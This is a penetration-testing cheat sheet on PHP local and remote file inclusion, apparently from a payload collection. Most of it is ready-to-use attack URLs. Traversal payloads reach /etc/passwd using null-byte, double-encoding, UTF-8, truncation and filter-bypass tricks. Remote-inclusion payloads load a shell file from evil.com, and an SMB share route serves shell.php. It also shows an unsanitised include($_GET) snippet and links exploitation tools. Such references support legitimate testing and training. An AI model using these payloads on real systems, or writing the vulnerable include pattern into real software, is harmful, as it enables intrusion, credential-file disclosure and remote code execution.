# file inclusion

> a file inclusion vulnerability refers to a type of security vulnerability in web applications, particularly prevalent in applications developed in php, where an attacker can include a file, usually exploiting a lack of proper input/output sanitization. this vulnerability can lead to a range of malicious activities, including code execution, data theft, and website defacement.

## summary

- [tools](#tools)
- [local file inclusion](#local-file-inclusion)
    - [null byte](#null-byte)
    - [double encoding](#double-encoding)
    - [utf-8 encoding](#utf-8-encoding)
    - [path truncation](#path-truncation)
    - [filter bypass](#filter-bypass)
- [remote file inclusion](#remote-file-inclusion)
    - [null byte](#null-byte-1)
    - [double encoding](#double-encoding-1)
    - [bypass allow_url_include](#bypass-allow_url_include)
- [labs](#labs)
- [references](#references)


## tools

* [p0cl4bs/kadimus](https://github.com/p0cl4bs/kadimus) (archived on oct 7, 2020) - kadimus is a tool to check and exploit lfi vulnerability.
* [d35m0nd142/lfisuite](https://github.com/d35m0nd142/lfisuite) - totally automatic lfi exploiter (+ reverse shell) and scanner
* [kurobeats/fimap](https://github.com/kurobeats/fimap) - fimap is a little python tool which can find, prepare, audit, exploit and even google automatically for local and remote file inclusion bugs in webapps.
* [lightos/panoptic](https://github.com/lightos/panoptic) - panoptic is an open source penetration testing tool that automates the process of search and retrieval of content for common log and config files through path traversal vulnerabilities.
* [hansmach1ne/lfimap](https://github.com/hansmach1ne/lfimap) - local file inclusion discovery and exploitation tool


## local file inclusion

**file inclusion vulnerability** should be differentiated from **path traversal**. the path traversal vulnerability allows an attacker to access a file, usually exploiting a "reading" mechanism implemented in the target application, when the file inclusion will lead to the execution of arbitrary code.

consider a php script that includes a file based on user input. if proper sanitization is not in place, an attacker could manipulate the `page` parameter to include local or remote files, leading to unauthorized access or code execution.

```php
<?php
$file = $_get['page'];
include($file);
?>
```

in the following examples we include the `/etc/passwd` file, check the `directory & path traversal` chapter for more interesting files.

```powershell
http://example.com/index.php?page=../../../etc/passwd
```



### null byte

:warning: in versions of php below 5.3.4 we can terminate with null byte (`%00`).

```powershell
http://example.com/index.php?page=../../../etc/passwd%00
```

**example**: joomla! component web tv 1.0 - cve-2010-1470

```ps1
{{baseurl}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00
```


### double encoding

```powershell
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```


### utf-8 encoding

```powershell
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

### path truncation

on most php installations a filename longer than `4096` bytes will be cut off so any excess chars will be thrown away.

```powershell
http://example.com/index.php?page=../../../etc/passwd............[add more]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[add more]
http://example.com/index.php?page=../../../etc/passwd/./././././.[add more] 
http://example.com/index.php?page=../../../[add more]../../../../etc/passwd
```

### filter bypass

```powershell
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5c../%5c../%5c../%5c../%5c../%5c../%5c../%5c../%5c../%5c../%5c../etc/passwd
```


## remote file inclusion

> remote file inclusion (rfi) is a type of vulnerability that occurs when an application includes a remote file, usually through user input, without properly validating or sanitizing the input.

remote file inclusion doesn't work anymore on a default configuration since `allow_url_include` is now disabled since php 5.

```ini
allow_url_include = on
```


most of the filter bypasses from lfi section can be reused for rfi.

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt
```

### null byte

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt%00
```


### double encoding

```powershell
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```


### bypass allow_url_include

when `allow_url_include` and `allow_url_fopen` are set to `off`. it is still possible to include a remote file on windows box using the `smb` protocol.

1. create a share open to everyone
2. write a php code inside a file : `shell.php`
3. include it `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`


## labs

* [root me - local file inclusion](https://www.root-me.org/en/challenges/web-server/local-file-inclusion)
* [root me - local file inclusion - double encoding](https://www.root-me.org/en/challenges/web-server/local-file-inclusion-double-encoding)
* [root me - remote file inclusion](https://www.root-me.org/en/challenges/web-server/remote-file-inclusion)
* [root me - php - filters](https://www.root-me.org/en/challenges/web-server/php-filters)


## references

* [cvv #1: local file inclusion - si9int - jun 20, 2018](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
* [exploiting remote file inclusion (rfi) in php application and bypassing remote url inclusion restriction - mannu linux - 2019-05-12](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
* [is php vulnerable and under what conditions? - april 13, 2015 - andreas venieris](http://0x191unauthorized.blogspot.fr/2015/04/is-php-vulnerable-and-under-what.html)
* [lfi cheat sheet - @arr0way - 24 apr 2016](https://highon.coffee/blog/lfi-cheat-sheet/)
* [testing for local file inclusion - owasp - 25 june 2017](https://www.owasp.org/index.php/testing_for_local_file_inclusion)
* [turning lfi into rfi - grayson christopher - 2017-08-14](https://web.archive.org/web/20170815004721/https://l.avala.mp/?p=241)